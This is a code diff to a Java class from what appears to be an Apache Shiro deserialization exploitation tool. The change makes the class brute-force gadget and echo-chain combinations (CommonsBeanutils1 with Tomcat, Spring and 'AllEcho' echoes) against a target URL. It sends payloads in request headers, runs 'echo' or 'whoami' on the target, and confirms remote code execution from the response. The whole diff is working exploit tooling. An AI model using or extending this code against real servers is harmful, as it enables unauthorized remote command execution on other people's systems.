@@ -10,14 +10,14 @@ import java.util.*;
 public class BruteGadget {
     public static List<String> bruteGadget(TargetOBJ url) {
         // 定义gadget链
-        List<String> gadgets = Collections.singletonList(
-                "CommonsBeanutils1"
-        );
+        List<String> gadgets = new ArrayList<>();
+        gadgets.add("CommonsBeanutils1");
 
         // 定义echo链
-        List<String> echos = Collections.singletonList(
-                "TomcatEcho"
-        );
+        List<String> echos = new ArrayList<>();
+        echos.add("TomcatEcho");
+        echos.add("SpringEcho");
+        echos.add("AllEcho");
 
         // 储存验证成功的gadget
         List<String> success_gadgets = new ArrayList<>();
@@ -29,9 +29,14 @@ public class BruteGadget {
                     Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
                     Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class);
                     String payload = (String) method.invoke(null, echo);
+
                     // 生成验证命令
                     String checkString = Tools.generateRandomString(20);
                     String command = "echo " + checkString;
+
+                    if (echo.equals("AllEcho")) {
+                        command = "whoami";
+                    }
 
                     // 构造请求头
                     Map<String, String> headers = new HashMap<>();
@@ -40,13 +45,25 @@ public class BruteGadget {
 
                     // 校验响应中是否存在
                     ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, null, headers, "GET");
-                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
+                    String result1 = Tools.bytesToString(responseOBJ.getResponse());    // 原始response
+                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));   //提取result的base64
                     result = Tools.bytesToString(Base64.getDecoder().decode(result));
 
-                    if (result.contains(checkString)) {
-                        System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 发现回显链: " + gadget + " -> " + echo);
-                        success_gadgets.add(gadget + "+" + echo);
+                    if (echo.equals("AllEcho")) {
+                        if (result1.contains("$$$")) {
+                            System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 发现回显链: " + gadget + " -> " + echo);
+                            success_gadgets.add(gadget + "+" + echo);
+                        } else {
+                            System.out.println("[" + Tools.color("FAIL", "RED") + "] 回显链无效: " + gadget + " -> " + echo);
+                        }
+                    } else {
+                        if (result.contains(checkString)) {
+                            System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 发现回显链: " + gadget + " -> " + echo);
+                            success_gadgets.add(gadget + "+" + echo);
+                        }
                     }
+                } catch (IndexOutOfBoundsException e) {
+                    System.out.println("[" + Tools.color("FAIL", "RED") + "] 回显链无效: " + gadget + " -> " + echo);
                 } catch (Exception e){
                     System.out.println("[" + Tools.color("EROR", "RED") + "] " + e.getMessage());
                 }
